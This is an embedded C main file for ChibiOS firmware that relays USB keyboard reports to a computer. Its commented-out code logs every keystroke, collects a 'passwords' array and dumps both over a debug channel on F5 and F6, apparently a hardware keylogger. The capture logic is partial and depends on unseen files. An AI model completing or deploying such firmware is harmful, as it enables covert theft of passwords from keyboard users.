//main.c

#include "ch.h"
#include "hal.h"

#include "led.h"
#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"
#include "timer.h"

int main(void)
{
    halInit();
    chSysInit();

    led_init();
    rtt_init();
    spi_init();
    usb_init();
    usbh_init();
    timer_init();

    timer_on();

    msg_t msg;
    msg_t usbmb_buffer[USBMB_SIZE];
    MAILBOX_DECL(usbmb, usbmb_buffer, USBMB_SIZE);

    while(1) {
        usbhMainLoop(&USBHD1);
        while(chMBFetch(&usbmb, &msg, TIME_INFINITE) == MSG_OK) {
            //uint8_t *report = msg;
            rtt_printf("msg = %08x", msg);
            /* send the key on the computer */
            //usb_report(&UHD2, report, 8);
            //get every input in a tab
//          uint16_t input = get_input_hid(report);
//          rtt_printf("Key: %c (%04x), input_index = %d", hid2azerty(input), input, input_index);
//          if((uint8_t)input) {
//              inputs[input_index] = input;
//              usbh_detector(hid2azerty(input));

//              //input loop
//              input_index++;
//              if(input_index >= NB_INPUT)
//                  input_index = 0;
//          }

//          if(report[2] == KEY_F6)
//              for(int i = 0; i < input_index; i++)
//                  rtt_printf("inputs[%d] = %c (%04x)", i, hid2azerty(passwords[i]), inputs[i]);

//          if(report[2] == KEY_F5)
//              for(int i = 0; i < password_index; i++)
//                  rtt_printf("passwords[%d] = %c (%04x)", i, hid2azerty(passwords[i]), passwords[i]);

//          if(report[2] == KEY_SCROLLLOCK)
//              print_password_terminal = true;
        }
        chThdSleepMilliseconds(50);
    }

    chThdSleep(TIME_INFINITE);
    return 0;
}
